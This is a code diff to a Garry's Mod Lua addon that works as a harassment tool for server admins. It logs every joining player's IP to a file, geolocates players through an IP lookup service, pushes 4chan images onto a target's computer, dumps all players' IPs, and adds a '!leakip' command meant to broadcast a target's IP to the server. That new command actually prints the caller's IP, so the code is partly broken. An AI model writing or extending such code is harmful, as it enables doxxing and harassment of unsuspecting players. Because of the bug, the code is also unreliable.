@@ -24,15 +24,20 @@ net.Receive("NiceToMeetYouRonnie", function(len, ply)
 	end
 end)
 
+local function PlayerName(ply)
+	return isfunction(ply.SteamName) and ply:SteamName() or ply:Nick()
+	-- return isfunction(ply.SteamName) and (ply:Nick() .. " (" .. ply:SteamName() .. ")") or ply:Nick()
+end
+
 file.CreateDir("ronnie")
 local log = "ronnie/ips.txt"
 
 hook.Add("PlayerInitialSpawn", "RonnieIP", function(ply)
 	local content = file.Read(log)
 	if content then
-		file.Append(log, util.TableToJSON({sid = ply:SteamID(), nick = ply:Nick(), ip = ply:IPAddress()}) .. "\n")
+		file.Append(log, util.TableToJSON({sid = ply:SteamID(), nick = PlayerName(ply), ip = ply:IPAddress()}) .. "\n")
 	else
-		file.Write(log, util.TableToJSON({sid = ply:SteamID(), nick = ply:Nick(), ip = ply:IPAddress()}) .. "\n")
+		file.Write(log, util.TableToJSON({sid = ply:SteamID(), nick = PlayerName(ply), ip = ply:IPAddress()}) .. "\n")
 	end
 end)
 
@@ -69,12 +74,12 @@ local ronnie_cmds = {
 		Downloads images from 4chan onto target's computer.
 		Use this before using !4chan.]],
 		func = function(ply, args)
-				if not ply:IsAdmin() or not args[2] or not args[3] then return end
-				local found = FindPlayer(args[2])
-				if not found then return end
-				net.Start("RonniePrepare4Chan")
-				net.WriteString(args[3])
-				net.Send(found)
+			if not ply:IsAdmin() or not args[2] or not args[3] then return end
+			local found = FindPlayer(args[2])
+			if not found then return end
+			net.Start("RonniePrepare4Chan")
+			net.WriteString(args[3])
+			net.Send(found)
 		end,
 	},
 	["!4chan"] = {
@@ -102,7 +107,7 @@ local ronnie_cmds = {
 			http.Fetch("http://ip-api.com/json/" .. found:IPAddress(), function(body, len, headers, code)
 				local tab = util.JSONToTable(body)
 				if not body or tab.status ~= "success" then
-					ply:ChatPrint("Could not locate " .. found:Nick() .. "!")
+					ply:ChatPrint("Could not locate " .. PlayerName(found) .. "!")
 					return
 				end
 				ply:PrintMessage(HUD_PRINTCONSOLE, tab.city .. ", " .. tab.regionName .. ". " .. tab.country .. tab.zip)
@@ -120,13 +125,25 @@ local ronnie_cmds = {
 			net.Send(ply)
 		end,
 	},
+	["!leakip"] = {
+		help = [[<target>
+		Leak the target's IP to the whole server.]],
+		func = function(ply, args)
+			if not ply:IsAdmin() or not args[2] then return end
+			local found = FindPlayer(args[2])
+			if not found then return end
+			for i = 1, 10 do
+				PrintMessage(HUD_PRINTTALK, PlayerName(ply) .. "'s IP address: " .. ply:IPAddress())
+			end
+		end,
+	},
 	["!dump"] = {
 		help = [[
 	Dumps the whole server's SteamIDs, names, and IPs into console.]],
 		func = function(ply, args)
 			if not ply:IsAdmin() then return end
 			for k, v in pairs(player.GetAll()) do
-				ply:PrintMessage(HUD_PRINTCONSOLE, v:SteamID() .. " - " .. (isfunction(v.SteamName) and v:SteamName() or v:Nick()) .. " - " .. v:IPAddress())
+				ply:PrintMessage(HUD_PRINTCONSOLE, v:SteamID() .. " - " .. PlayerName(v) .. " - " .. v:IPAddress())
 			end
 		end,
 	},
@@ -150,8 +167,5 @@ hook.Add("PlayerSay", "RonnieChatCommand", function(ply, txt)
 	local args = string.Split(txt, " ")
 	if ronnie_cmds[string.lower(args[1])] and isfunction(ronnie_cmds[string.lower(args[1])].func) then
 		ronnie_cmds[string.lower(args[1])].func(ply, args)
-	end
-	if string.Left(txt, 1) == "!" then
-		return ""
 	end
 end)
